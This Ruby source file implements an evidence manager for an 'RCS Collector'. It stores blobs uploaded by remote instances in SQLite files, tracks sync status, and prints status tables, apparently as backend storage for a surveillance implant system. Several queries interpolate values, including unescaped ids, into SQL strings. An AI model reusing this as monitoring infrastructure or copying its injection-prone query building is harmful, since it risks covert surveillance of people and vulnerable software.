#
#  Evidence Manager module for handling evidences
#

require 'fileutils'
require_relative 'sqlite'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/fixnum'

module RCS
module Collector

class EvidenceManager
  include Singleton
  include RCS::Tracer

  REPO_DIR = Dir.pwd + '/evidence'

  SYNC_IDLE = 0
  SYNC_IN_PROGRESS = 1
  SYNC_TIMEOUTED = 2
  SYNC_PROCESSING = 3

  def file_from_session(session)
    return REPO_DIR + '/' + session[:ident] + '_' + session[:instance]
  end

  def sync_start(session, version, user, device, source, time)

    # create the repository for this instance
    return unless create_repository session
    
    trace :info, "[#{session[:instance]}] Sync is in progress..."

    SQLite.safe_escape user, device, source

    begin
      db = SQLite.open(file_from_session(session))
      db.execute("UPDATE info SET ident = '#{session[:ident]}',
                                  instance = '#{session[:instance]}',
                                  subtype = '#{session[:subtype]}',
                                  version = #{version},
                                  user = '#{user}',
                                  device = '#{device}',
                                  source = '#{source}',
                                  sync_time = #{time},
                                  sync_status = #{SYNC_IN_PROGRESS};")

      db.close
    rescue Exception => e
      trace :warn, "Cannot insert into the repository: #{e.message}"
    end
  end
  
  def sync_timeout(session)
    # sanity check
    path = file_from_session(session)
    return unless File.exist?(path)
    
    begin
      db = SQLite.open(path)
      # update only if the status in IN_PROGRESS
      # this will prevent erroneous overwrite of the IDLE status
      db.execute("UPDATE info SET sync_status = #{SYNC_TIMEOUTED} WHERE sync_status = #{SYNC_IN_PROGRESS};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot update the repository: #{e.message}"
    end
    trace :info, "[#{session[:instance]}] Sync has been timeouted"
  end

  def sync_status(session, status)

    path = file_from_session(session)
    return unless File.exist?(path)

    begin
      db = SQLite.open(path)
      # update only if the status in IN_PROGRESS
      # this will prevent erroneous overwrite of the IDLE status
      db.execute("UPDATE info SET sync_status = #{status};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot update the repository: #{e.message}"
    end

  end

  def sync_timeout_all
    begin
      Dir[REPO_DIR + '/*'].each do |e|
        db = SQLite.open(e)
        # update only if the status in IN_PROGRESS
        # this will prevent erroneous overwrite of the IDLE status
        db.execute("UPDATE info SET sync_status = #{SYNC_TIMEOUTED} WHERE sync_status = #{SYNC_IN_PROGRESS};")
        db.close
      end
    rescue Exception => e
      trace :warn, "Cannot update the repository: #{e.message}"
    end
  end

  def sync_end(session)
    # sanity check
    path = file_from_session(session)
    return unless File.exist?(path)
        
    begin
      db = SQLite.open(path)
      db.execute("UPDATE info SET sync_status = #{SYNC_IDLE};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot update the repository: #{e.message}"
    end
    trace :info, "[#{session[:instance]}] Sync ended"
  end

  def store_evidence(session, size, content)
    path = file_from_session(session)
    # sanity check
    raise "No repository for this instance" unless File.exist?(path)

    # store the evidence
    begin
      db = SQLite.open(path)
      db.execute("INSERT INTO evidence (size, content) VALUES (#{size}, ? );", SQLite.blob(content))
      db.close
    rescue Exception => e
      trace :warn, "Cannot insert into the repository: #{e.message}"
      raise "Cannot save evidence"
    end
  end
  
  def get_evidence(id, instance)
    # sanity check
    path = REPO_DIR + '/' + instance
    return unless File.exists?(path)
    
    query = "SELECT content FROM evidence WHERE id=#{id};"
    begin
      db = SQLite.open(path)
      ret = db.execute(query)
      db.close
      return ret.first.first
    rescue Exception => e
      trace :warn, "Cannot read from the repository: #{e.message} [#{e.class}]"
      return nil
    end
  end

  def del_evidence(id, instance)
    # sanity check
    path = REPO_DIR + '/' + instance
    return unless File.exists?(path)

    begin
      db = SQLite.open(path)
      ret = db.execute("DELETE FROM evidence WHERE id=#{id};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot delete from the repository: #{e.message}"
    end
  end

  def instances
    # return all the instances
    entries = []
    Dir[REPO_DIR + '/*'].each do |e|
      next if e['-journal']
      entries << File.basename(e)
    end
    return entries
  end

  def instance_info(instance)
    # sanity check
    path = REPO_DIR + '/' + instance
    raise "cannot find sqlite for instance #{instance}" unless File.exist?(path)
    
    begin
      db = SQLite.open(path)
      db.results_as_hash = true
      ret = db.execute("SELECT * FROM info;")
      db.close
      return ret.first
    rescue Exception => e
      trace :warn, "Cannot read from the repository: #{e.message}"
    end
  end

  def evidence_info(instance)
    # sanity check
    path = REPO_DIR + '/' + instance
    return unless File.exist?(path)

    begin
      db = SQLite.open(path)
      ret = db.execute("SELECT size FROM evidence;")
      db.close
      return ret
    rescue Exception => e
      trace :warn, "Cannot read from the repository: #{e.message}"
    end
  end
  
  def evidence_ids(instance)
    # sanity check
    path = REPO_DIR + '/' + instance
    return [] unless File.exist?(path)

    # delete file if empty
    if File.size(path) == 0
      FileUtils.rm_rf path if File.size(path) == 0
      return []
    end
    
    begin
      db = SQLite.open(path)
      ret = db.execute("SELECT id FROM evidence;")
      db.close
      return ret.flatten
    rescue Exception => e
      trace :warn, "Cannot read from the repository: #{e.message}"
    end
  end

  def create_repository(session)
    # ensure the repository directory is present
    Dir::mkdir(REPO_DIR) if not File.directory?(REPO_DIR)

    trace :info, "Creating repository for [#{session[:ident]}_#{session[:instance]}]"
    
    # create the repository
    begin
      db = SQLite.open file_from_session(session)
    rescue Exception => e
      trace :error, "Problems creating the repository file: #{e.message}"
      return false
    end

    # the schema of repository
    schema = ["CREATE TABLE IF NOT EXISTS info (ident CHAR(16),
                                                instance CHAR(40),
                                                subtype CHAR(16),
                                                version INT,
                                                user CHAR(256),
                                                device CHAR(256),
                                                source CHAR(256),
                                                sync_time INT,
                                                sync_status INT)",
              "CREATE TABLE IF NOT EXISTS evidence (id INTEGER PRIMARY KEY ASC,
                                                    size INT,
                                                    content BLOB)"
             ]
    
    # create all the tables
    schema.each do |query|
      begin
        db.execute query
        # insert the entry here, will be updated in sync_start methods
        count = db.execute("SELECT COUNT(*) from info;")
        # only the first time
        if count.first.first == 0
          db.execute("INSERT INTO info VALUES ('', '', '', 0, '', '', '', 0, 0);")
        end
      rescue Exception => e
        trace :error, "Cannot execute the statement : #{e.message}"
        db.close
        return false
      end
    end

    db.close

    return true
  end

  def run(options)

    # delete all the instance with zero evidence pending and not in progress
    if options[:purge] then
      instances.each do |e|
        entry = instance_info(e)
        evidence = evidence_info(e)
        # IN_PROGRESS sync must be preserved
        # evidences must be preserved
        File.delete(REPO_DIR + '/' + e) if entry['sync_status'] != SYNC_IN_PROGRESS and evidence.length == 0
      end
    end

    entries = []

    # we want just one instance
    if options[:instance] then
      entry = instance_info(options[:instance])
      if entry.nil? then
        puts "\nERROR: Invalid instance"
        return 1
      end
      entry[:evidence] = evidence_info(options[:instance])
      entries << entry
    else
      # take the info from all the instances
      instances.each do |e|
        entry = instance_info(e)
        unless entry.nil? then
          entry[:evidence] = evidence_info(e)
          entries << entry
        end
      end
    end
    
    entries.sort! { |a, b| a['sync_time'] <=> b['sync_time'] }
    entries.reverse!

    # table definitions
    table_width = 128
    table_line = '+' + '-' * table_width + '+'

    # print the table header
    puts
    puts table_line
    puts '|' + 'instance'.center(55) + '|' + 'subtype'.center(12) + '|' +
         'last sync time'.center(25) + '|' + 'status'.center(13) + '|' +
         'logs'.center(6) + '|' + 'size'.center(12) + '|'
    puts table_line

    # print the table entries
    entries.each do |e|
      time = Time.at(e['sync_time']).getutc
      time = time.to_s.split(' +').first
      status = status_to_s(e['sync_status'])
      count = e[:evidence].length.to_s

      array = e[:evidence]
      # calculate the sum of all the elements
      if array.length != 0 then
        # calculate the sum
        size = array.flatten.reduce(:+)
      else
        size = 0
      end

      puts "|#{e['ident']}_#{e['instance']}|#{e['subtype'].slice(0..11).center(12)}| #{time} |#{status.center(13)}|#{count.rjust(5)} |#{size.to_s_bytes.rjust(11)} |"
    end
    
    # print the table footer
    puts table_line    
    puts

    # detailed information only if one instance was specified
    if options[:instance] then
      entry.delete(:evidence)
      # cleanup the duplicates
      entry.delete_if { |key, value| key.class != String }
    end

    return 0
  end
  
  private
  def status_to_s(status)
    statuses = {SYNC_IDLE => "IDLE", SYNC_IN_PROGRESS => "IN PROGRESS", SYNC_TIMEOUTED => "TIMEOUT", SYNC_PROCESSING => "PROCESSING"}
    return statuses[status]
  end
  
  # executed from rcs-collector-status
  def self.run!(*argv)
    # reopen the class and declare any empty trace method
    # if called from command line, we don't have the trace facility
    self.class_eval do
      def trace(level, message)
        puts message
      end
    end

    # This hash will hold all of the options parsed from the command-line by OptionParser.
    options = {}

    optparse = OptionParser.new do |opts|
      opts.banner = "Usage: rcs-collector-status [options] [instance]"

      opts.on( '-i', '--instance INSTANCE', String, 'Show statistics only for this INSTANCE' ) do |inst|
        options[:instance] = inst
      end

      opts.on( '-p', '--purge', 'Purge all the instance with no pending tasks' ) do
        options[:purge] = true
      end

      opts.on( '-h', '--help', 'Display this screen' ) do
        puts opts
        return 0
      end
    end

    optparse.parse(argv)

    # execute the manager
    return EvidenceManager.instance.run(options)
  end

end #EvidenceManager

end #Collector::
end #RCS::